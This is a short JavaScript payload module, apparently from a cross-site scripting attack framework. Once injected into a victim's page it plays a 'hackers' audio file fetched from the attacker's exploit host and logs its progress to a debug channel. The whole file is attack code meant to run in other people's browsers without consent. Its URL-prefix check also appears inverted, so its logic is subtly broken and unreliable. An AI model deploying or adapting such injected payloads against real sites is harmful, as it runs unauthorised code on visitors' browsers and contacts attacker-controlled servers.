xssmin();
xss.dbg("start hackers audio");
// put this in a function so we don't pollute the global namespace
function xssaudio() {
	var file = xss.opt("file", "the audio file to play() absolute or relative to public", "hkhack.mp3");
	var hurl = file;
	if (!file.indexOf("http://"))
		hurl = "http://"+xss.sploit+"/"+file;
	var audio = new Audio(hurl);
	audio.play();
	xss.dbg("audio played");
}
xssaudio();
